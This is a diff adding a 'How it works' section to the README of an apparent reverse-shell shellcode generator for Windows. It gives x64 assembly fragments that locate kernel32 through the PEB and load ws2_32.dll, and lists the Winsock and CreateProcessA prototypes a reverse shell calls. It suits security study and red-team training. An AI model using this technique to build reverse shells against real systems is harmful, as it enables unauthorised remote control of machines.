@@ -39,3 +39,81 @@ p0cket-shell.py --payload  [hardcode | resolve]
                 --format   [c | powershell | python | exe | raw]
                [--output]  example.py
 ```
+
+## How it works
+
+Standalone reverse shell shellcode must follow a specific process. Fortunately for us, it is very straight forward.
+
+1. Get handle to kernel32.dll
+2. Get handle to ws2_32.dll
+3. Save functions: WSAStartup, WSASocketA, WSAConnect CreateProcessA
+4. Call functions: WSAStartup, WSASocketA, WSAConnect CreateProcessA
+
+###### Grab library handles
+```nasm
+get_kernel32:
+    mov   rax,   gs:[0x60]              ; PEB
+    mov   rax,   [rax + 0x18]           ; PEB->Ldr
+    mov   rax,   [rax + 0x30]           ; Ldr->InMemoryOrderModuleList
+    mov   rax,   [rax]                  ; InMemoryOrderModuleList.Flink (ntdll.dll)
+    mov   rax,   [rax]                  ; Flink->Flink (kernel32.dll)
+    mov   rbp,   [rax + 0x10]           ; Base Address
+```
+```nasm 
+load_ws2_32:
+    push  0x006c6c                      ; '0\ll'
+    mov   rax,   0x642e32335f327377     ; 'd.23_2sw'
+    push  rax                           ; Push to stack
+    mov   rcx,   rsp                    ; Save pointer 'ws2_32.dll' to rcx
+    sub   rsp,   0x28                   ; Align stack
+    call  r14                           ; Call LoadLibraryA (Base Address stored in rax)
+```
+
+Now from here we can grab the functions within the 2 libraries and then use them how we want. We have to remember how each function behaves and remember whats needed for each function.
+
+###### Perform function calls
+
+```c
+int WSAStartup(
+  WORD                 wVersionRequested,
+  LPWSADATA            lpWSAData
+);
+```
+
+```c
+SOCKET WSASocketA(
+  int                  af,
+  int                  type,
+  int                  protocol,
+  LPWSAPROTOCOL_INFOA  lpProtocolInfo,
+  GROUP                g,
+  DWORD                dwFlags
+);
+```
+
+```c
+int WSAConnect(
+  SOCKET               s,
+  const sockaddr      *name,
+  int                  namelen,
+  LPWSABUF             lpCallerData,
+  LPWSABUF             lpCalleeData,
+  LPQOS                lpSQOS,
+  LPQOS                lpGQOS
+);
+```
+
+```c
+BOOL CreateProcessA(
+  LPCSTR                lpApplicationName,
+  LPSTR                 lpCommandLine,
+  LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  BOOL                  bInheritHandles,
+  DWORD                 dwCreationFlags,
+  LPVOID                lpEnvironment,
+  LPCSTR                lpCurrentDirectory,
+  LPSTARTUPINFOA        lpStartupInfo,
+  LPPROCESS_INFORMATION lpProcessInformation
+);
+```
